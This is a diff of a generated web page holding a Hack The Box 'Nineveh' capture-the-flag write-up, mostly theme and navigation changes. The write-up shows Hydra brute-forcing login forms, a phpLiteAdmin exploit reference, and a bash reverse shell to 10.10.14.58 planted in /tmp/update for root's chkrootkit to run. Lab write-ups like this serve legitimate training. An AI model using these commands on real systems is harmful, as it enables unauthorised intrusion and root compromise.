@@ -25,7 +25,7 @@
         
           
           
-          <meta name="theme-color" content="#ff6e42">
+          <meta name="theme-color" content="#000000">
         
       
     
@@ -52,7 +52,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-orange" data-md-color-accent="green">
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="orange">
       
   
     
@@ -153,9 +153,7 @@
 
 
 
-  
-
-<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
     <a href="../.." title="Notes" class="md-nav__button md-logo" aria-label="Notes">
       
@@ -191,7 +189,9 @@
   
   
     
-    <li class="md-nav__item md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
       
         <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" data-md-state="indeterminate" type="checkbox" id="nav-2" checked>
@@ -258,17 +258,76 @@
   
   
     
-    <li class="md-nav__item md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
       
         <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" data-md-state="indeterminate" type="checkbox" id="nav-3" checked>
       
       <label class="md-nav__link" for="nav-3">
+        File Transfer
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="File Transfer" data-md-level="1">
+        <label class="md-nav__title" for="nav-3">
+          <span class="md-nav__icon md-icon"></span>
+          File Transfer
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../filetransfer/filetransfer_setup/" class="md-nav__link">
+        Environment Setup
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../filetransfer/ft_windows/" class="md-nav__link">
+        Windows File Transfers
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" data-md-state="indeterminate" type="checkbox" id="nav-4" checked>
+      
+      <label class="md-nav__link" for="nav-4">
         WebApps
         <span class="md-nav__icon md-icon"></span>
       </label>
       <nav class="md-nav" aria-label="WebApps" data-md-level="1">
-        <label class="md-nav__title" for="nav-3">
+        <label class="md-nav__title" for="nav-4">
           <span class="md-nav__icon md-icon"></span>
           WebApps
         </label>
@@ -303,17 +362,19 @@
   
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" checked>
       
-      <label class="md-nav__link" for="nav-4">
+      <label class="md-nav__link" for="nav-5">
         HTB
         <span class="md-nav__icon md-icon"></span>
       </label>
       <nav class="md-nav" aria-label="HTB" data-md-level="1">
-        <label class="md-nav__title" for="nav-4">
+        <label class="md-nav__title" for="nav-5">
           <span class="md-nav__icon md-icon"></span>
           HTB
         </label>
@@ -448,6 +509,78 @@
               </div>
             
             
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    HTTP
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-80" class="md-nav__link">
+    Port 80
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#port-443" class="md-nav__link">
+    Port 443
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-www-data" class="md-nav__link">
+    Shell as www-data
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privesc" class="md-nav__link">
+    Privesc
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
           
           <div class="md-content">
             <article class="md-content__inner md-typeset">
@@ -462,7 +595,33 @@
 <h2 id="recon">Recon</h2>
 <ul>
 <li>Nmap
-<div class="highlight"><pre><span></span><code>─❯ sudo nmap -p- -T5 -Pn -sV -sC <span class="nv">$target</span> -v 
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>─❯ sudo nmap -p- -T5 -Pn -sV -sC <span class="nv">$target</span> -v 
 Nmap scan report <span class="k">for</span> <span class="m">10</span>.129.99.169
 Host is up <span class="o">(</span><span class="m">0</span>.045s latency<span class="o">)</span>.
 Not shown: <span class="m">65533</span> filtered ports
@@ -489,7 +648,8 @@ PORT    STATE SERVICE  VERSION
 <span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
 <span class="p">|</span> tls-alpn: 
 <span class="p">|</span>_  http/1.1
-</code></pre></div></li>
+</code></pre></div>
+</td></tr></table></li>
 </ul>
 <h2 id="http">HTTP</h2>
 <ul>
@@ -503,15 +663,35 @@ PORT    STATE SERVICE  VERSION
 <ul>
 <li>In the src of the webpage we find the following comment, we can try to bruteforce creds after:</li>
 </ul>
-<div class="highlight"><pre><span></span><code><span class="c">&lt;!-- @admin! MySQL is been installed.. please fix the login page! ~amrois --&gt;</span>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="c">&lt;!-- @admin! MySQL is been installed.. please fix the login page! ~amrois --&gt;</span>
 </code></pre></div>
+</td></tr></table>
 </li>
 </ul>
 <h3 id="port-443">Port 443</h3>
 <ul>
 <li>
 <p>Fuzzing the website on 443 find some directories
-    <div class="highlight"><pre><span></span><code>ffuf -v -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://nineveh.htb/FUZZ -v -c -t <span class="m">100</span>
+    <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>ffuf -v -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://nineveh.htb/FUZZ -v -c -t <span class="m">100</span>
 ...
 <span class="o">[</span>Status: <span class="m">301</span>, Size: <span class="m">309</span>, Words: <span class="m">20</span>, Lines: <span class="m">10</span><span class="o">]</span>
 <span class="p">|</span> URL <span class="p">|</span> https://nineveh.htb/db
@@ -531,7 +711,8 @@ PORT    STATE SERVICE  VERSION
 <span class="p">|</span> --&gt; <span class="p">|</span> https://nineveh.htb/secure_notes/
 * FUZZ: secure_notes
 ...
-</code></pre></div></p>
+</code></pre></div>
+</td></tr></table></p>
 </li>
 <li>
 <p>On the /db/ directory we find the following</p>
@@ -546,7 +727,30 @@ PORT    STATE SERVICE  VERSION
 <ul>
 <li>
 <p>Download the image and check its metadata:
-<div class="highlight"><pre><span></span><code>╰─❯ exiftool nineveh.png 
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>╰─❯ exiftool nineveh.png 
 ExifTool Version Number         : <span class="m">12</span>.16
 File Name                       : nineveh.png
 Directory                       : .
@@ -570,17 +774,24 @@ Software                        : Shutter
 Warning                         : <span class="o">[</span>minor<span class="o">]</span> Trailer data after PNG IEND chunk
 Image Size                      : 1497x746
 Megapixels                      : <span class="m">1</span>.1
-</code></pre></div></p>
+</code></pre></div>
+</td></tr></table></p>
 </li>
 <li>
 <p>We see a Warning which told us that there is a trailer data. We extract it with <code>binwalk</code>
-<div class="highlight"><pre><span></span><code>╰─❯ binwalk nineveh.png  
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>╰─❯ binwalk nineveh.png  
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
 <span class="m">0</span>             0x0             PNG image, <span class="m">1497</span> x <span class="m">746</span>, <span class="m">8</span>-bit/color RGB, non-interlaced
 <span class="m">84</span>            0x54            Zlib compressed data, best compression
 <span class="m">2881744</span>       0x2BF8D0        POSIX tar archive <span class="o">(</span>GNU<span class="o">)</span>
-</code></pre></div></p>
+</code></pre></div>
+</td></tr></table></p>
 </li>
 <li>
 <p>Examining the files
@@ -594,13 +805,19 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 <ul>
 <li>We try to brute the admin creds with Hydra on the port 80 login.php file</li>
 </ul>
-<div class="highlight"><pre><span></span><code>╰─❯ hydra nineveh.htb -l admin -P /usr/share/seclists/Passwords/probable-v2-top12000.txt http-post-form <span class="s2">&quot;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid password&quot;</span> 
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>╰─❯ hydra nineveh.htb -l admin -P /usr/share/seclists/Passwords/probable-v2-top12000.txt http-post-form <span class="s2">&quot;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid password&quot;</span> 
 ...<span class="o">[</span>snip<span class="o">]</span>...
 <span class="o">[</span>DATA<span class="o">]</span> attacking http-post-form://nineveh.htb:80/department/login.php:username<span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>^PASS^:Invalid password
 <span class="o">[</span><span class="m">80</span><span class="o">][</span>http-post-form<span class="o">]</span> host: nineveh.htb   login: admin   password: 1q2w3e4r5t
 <span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
 Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at <span class="m">2021</span>-02-18 <span class="m">20</span>:06:42
 </code></pre></div>
+</td></tr></table>
 <ul>
 <li>
 <p>Then we log and get redirected to <code>http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt</code></p>
@@ -616,13 +833,19 @@ Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span cl
 </li>
 <li>
 <p>Coming back into the phpLiteAdmin application, we also bruteforce creds with Hydra finding the password is <code>password123</code></p>
-<div class="highlight"><pre><span></span><code>╰─❯ hydra nineveh.htb -l user -P /usr/share/seclists/Passwords/probable-v2-top12000.txt https-post-form <span class="s2">&quot;/db/index.php:password=^PASS^&amp;proc_login=true:Incorrect password&quot;</span> 
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>╰─❯ hydra nineveh.htb -l user -P /usr/share/seclists/Passwords/probable-v2-top12000.txt https-post-form <span class="s2">&quot;/db/index.php:password=^PASS^&amp;proc_login=true:Incorrect password&quot;</span> 
 ...
 <span class="o">[</span>DATA<span class="o">]</span> attacking http-post-forms://nineveh.htb:443/db/index.php:password<span class="o">=</span>^PASS^<span class="p">&amp;</span><span class="nv">proc_login</span><span class="o">=</span>true:Incorrect password
 <span class="o">[</span><span class="m">443</span><span class="o">][</span>http-post-form<span class="o">]</span> host: nineveh.htb   login: user   password: password123
 <span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
 Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at <span class="m">2021</span>-02-18 <span class="m">18</span>:37:37
 </code></pre></div>
+</td></tr></table>
 <ul>
 <li>
 <p>Now that we have access to phpLiteAdmin, and we confirmed before the version is 1.9, we can find a reliable <a href="https://www.exploit-db.com/exploits/24044">exploit</a> for this. To exploit it we do the following:</p>
@@ -651,8 +874,9 @@ Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span cl
 </li>
 <li>
 <p>Just need to create a file in <code>/tmp/</code> called <code>update</code> that will be executed.
-<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.58/5555 0&gt;&amp;1&#39; &amp;&quot;</span> &gt; /tmp/update
-</code></pre></div></p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.58/5555 0&gt;&amp;1&#39; &amp;&quot;</span> &gt; /tmp/update
+</code></pre></div>
+</td></tr></table></p>
 </li>
 <li>
 <p>Wait for the user root to execute <code>chkrootkit</code> and we are done.
@@ -733,7 +957,7 @@ Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span cl
       <script>
         app = initialize({
           base: "../..",
-          features: ['navigation.expand', 'toc.integrate'],
+          features: ['navigation.sections', 'navigation.expand'],
           search: Object.assign({
             worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
           }, typeof search !== "undefined" && search)
